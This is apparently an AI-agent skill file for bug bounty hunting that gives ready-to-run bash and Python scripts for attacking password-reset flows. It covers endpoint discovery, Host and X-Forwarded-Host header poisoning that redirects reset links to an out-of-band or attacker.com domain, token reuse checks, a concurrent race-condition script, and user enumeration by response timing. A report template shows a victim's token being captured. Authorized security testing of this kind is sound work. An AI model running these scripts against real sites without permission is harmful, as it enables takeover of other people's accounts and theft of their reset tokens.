---
name: k1nzr3c0n-hunt-forgot-password
description: "Hunt password reset flow vulnerabilities. Token entropy analysis, expiry/invalidation testing, Host header injection in reset emails (poison link domain), race condition on token claim, no invalidation after use, user enumeration via response diff, parallel token requests (two valid tokens = race window)."
tags: [password-reset, ato, token, hunt, web-security, bug-bounty]
---

# K1NZR3C0N Hunt — Forgot Password / Password Reset

> **Host header injection = Critical**: attacker receives victim's reset link to attacker.com.
> **Two-account rule**: always test with one account you own + one you observe (email timing).

---

## Phase 0 — Map Reset Flow

```bash
TARGET="${TARGET:-}"
HUNT="/tmp/hunt_reset_${TARGET//[^a-zA-Z0-9]/_}"
mkdir -p "$HUNT"
OOB="${OOB:-$(openssl rand -hex 4).oastify.com}"

echo "=== Reset Flow Mapping ==="
for EP in /forgot-password /forgot /reset-password /password-reset /password/forgot \
  /auth/forgot /account/forgot /users/password /api/password-reset /api/auth/forgot; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" "https://${TARGET}${EP}")
  [ "$CODE" != "404" ] && [ "$CODE" != "000" ] && echo "  [$CODE] ${EP}"
done
```

## Phase 1 — Host Header Injection

```bash
echo "=== Host Header Injection in Reset Email ==="
BASE="https://${TARGET}"
RESET_EP="${RESET_ENDPOINT:-/forgot-password}"
YOUR_EMAIL="${YOUR_EMAIL:-attacker_test@protonmail.com}"
OOB_DOMAIN="${OOB}"

echo "Test 1: Poison Host header to OOB domain"
curl -sk -X POST "${BASE}${RESET_EP}" \
  -H "Host: ${OOB_DOMAIN}" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"${YOUR_EMAIL}\"}"
echo "  → Check email: if reset link points to https://${OOB_DOMAIN}/reset?token=... → CRITICAL"

echo ""
echo "Test 2: X-Forwarded-Host injection"
curl -sk -X POST "${BASE}${RESET_EP}" \
  -H "X-Forwarded-Host: ${OOB_DOMAIN}" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"${YOUR_EMAIL}\"}"

echo ""
echo "Test 3: X-Original-URL / X-Rewrite-URL"
curl -sk -X POST "${BASE}${RESET_EP}" \
  -H "X-Original-URL: https://${OOB_DOMAIN}" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"${YOUR_EMAIL}\"}"
```

## Phase 2 — Token Analysis

```bash
echo "=== Token Entropy Analysis ==="
echo "Request 5 consecutive tokens for the SAME email (keep all valid):"
echo ""

YOUR_EMAIL="${YOUR_EMAIL:-your_test@example.com}"
RESET_EP="${RESET_ENDPOINT:-/forgot-password}"
BASE="https://${TARGET}"

for I in $(seq 1 5); do
  curl -sk -X POST "${BASE}${RESET_EP}" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"${YOUR_EMAIL}\"}" > /dev/null
  echo "  Request $I sent at $(date +%T)"
  sleep 1
done

echo ""
echo "From the 5 emails received, note tokens:"
echo "  - Length uniform? (short < 16 chars = weak)"
echo "  - Sequential numbers? (000001, 000002 = guessable)"
echo "  - Timestamp-based? (MD5 of email+timestamp = predict from OSINT)"
echo "  - UUID v4? (good) vs UUID v1? (timestamp-based = predictable)"
echo ""
echo "  High entropy (random hex 32+ chars) = likely secure → move on"
echo "  Low entropy OR sequential → test exhaustion"
```

## Phase 3 — Token Expiry and Invalidation

```bash
echo "=== Token Expiry + Invalidation Testing ==="
BASE="https://${TARGET}"
RESET_USE_EP="${RESET_USE_ENDPOINT:-/reset-password}"
YOUR_TOKEN="${YOUR_TOKEN:-TOKEN_FROM_EMAIL}"

echo "Test 1: Use token after 24h (request now, check tomorrow):"
echo "  This is a manual test — note token from email, wait, then try to use it"
echo ""

echo "Test 2: Use same token TWICE (no invalidation after use):"
curl -sk -X POST "${BASE}${RESET_USE_EP}" \
  -H "Content-Type: application/json" \
  -d "{\"token\":\"${YOUR_TOKEN}\",\"password\":\"NewPassword123!\"}"
echo ""
echo "Second use (reuse):"
curl -sk -X POST "${BASE}${RESET_USE_EP}" \
  -H "Content-Type: application/json" \
  -d "{\"token\":\"${YOUR_TOKEN}\",\"password\":\"DifferentPass456!\"}" | head -3
echo "  If second use succeeds → token not invalidated → ATO via pre-used token"

echo ""
echo "Test 3: Token still valid after password change via account (not reset):"
echo "  1. Request reset token"
echo "  2. Log into account normally, change password via settings"
echo "  3. Try to use reset token → should fail (session invalidated all tokens)"
```

## Phase 4 — Race Condition

```bash
echo "=== Race Condition on Reset Token ==="
BASE="https://${TARGET}"
RESET_USE_EP="${RESET_USE_ENDPOINT:-/reset-password}"
YOUR_TOKEN="${YOUR_TOKEN:-TOKEN_FROM_EMAIL}"

cat > /tmp/reset_race.py << 'PYEOF'
import asyncio, aiohttp, sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "target.com"
TOKEN = sys.argv[2] if len(sys.argv) > 2 else "YOUR_TOKEN"
ENDPOINT = "/reset-password"

async def reset(session, password):
    try:
        async with session.post(
            f"https://{TARGET}{ENDPOINT}",
            json={"token": TOKEN, "password": password},
            timeout=aiohttp.ClientTimeout(total=10)
        ) as r:
            return r.status, await r.text()
    except Exception as e:
        return 0, str(e)

async def race():
    async with aiohttp.ClientSession() as s:
        results = await asyncio.gather(*[
            reset(s, f"Password{i}!")
            for i in range(20)
        ])
        successes = [(st, body) for st, body in results if st == 200]
        print(f"[+] {len(successes)}/20 succeeded")
        for s, b in successes[:3]:
            print(f"  {s}: {b[:80]}")

asyncio.run(race())
PYEOF
echo "  python3 /tmp/reset_race.py ${TARGET} TOKEN_FROM_EMAIL"
echo "  Multiple success = race window → could be used by attacker who intercepts token URL"
```

## Phase 5 — User Enumeration

```bash
echo "=== User Enumeration via Reset Response ==="
BASE="https://${TARGET}"
RESET_EP="${RESET_ENDPOINT:-/forgot-password}"

echo "Compare responses for known and unknown emails:"
KNOWN_RESP=$(curl -sk -X POST "${BASE}${RESET_EP}" \
  -H "Content-Type: application/json" \
  -d '{"email":"your_real_account@example.com"}' -w "\nHTTP:%{http_code}\nTIME:%{time_total}")
UNKNOWN_RESP=$(curl -sk -X POST "${BASE}${RESET_EP}" \
  -H "Content-Type: application/json" \
  -d '{"email":"doesnotexist_xyz789@example.com"}' -w "\nHTTP:%{http_code}\nTIME:%{time_total}")

echo "  Known email response:"
echo "$KNOWN_RESP" | tail -3 | sed 's/^/    /'
echo "  Unknown email response:"
echo "$UNKNOWN_RESP" | tail -3 | sed 's/^/    /'
echo ""
echo "  If response body/status differs → email enumeration"
echo "  If timing differs >100ms → timing-based enumeration"
echo "  (Note: enumeration alone is usually Low severity, not typically submittable standalone)"
```

## Gate 0

```bash
echo "=== Password Reset Gate 0 ==="
echo "  □ Host header: reset email received at OOB domain (not just OOB DNS)"
echo "  □ Token reuse: second password change with same token succeeds"
echo "  □ Token entropy: sequential/predictable pattern confirmed"
echo "  □ Race: >1 concurrent reset accepted for same token"
echo "  □ ATO via reset: complete takeover of victim account demonstrated"
echo ""
echo "  SEVERITY: Host header injection = High (ATO of any account)"
echo "  Token reuse = Medium (ATO if token intercepted)"
echo "  Enumeration = Low-Info"
echo ""
echo "  /skill k1nzr3c0n-triage"
```

## Report Formula
```
Host header injection in password reset on [/forgot-password]: POST with Host: attacker.com causes reset email to contain link https://attacker.com/reset?token=abc123 — Critical ATO: attacker can request reset for any victim email and receive their reset token
Password reset token not invalidated after use on [/reset-password]: same token accepted for second password change 5 minutes after first use — valid session re-established
```
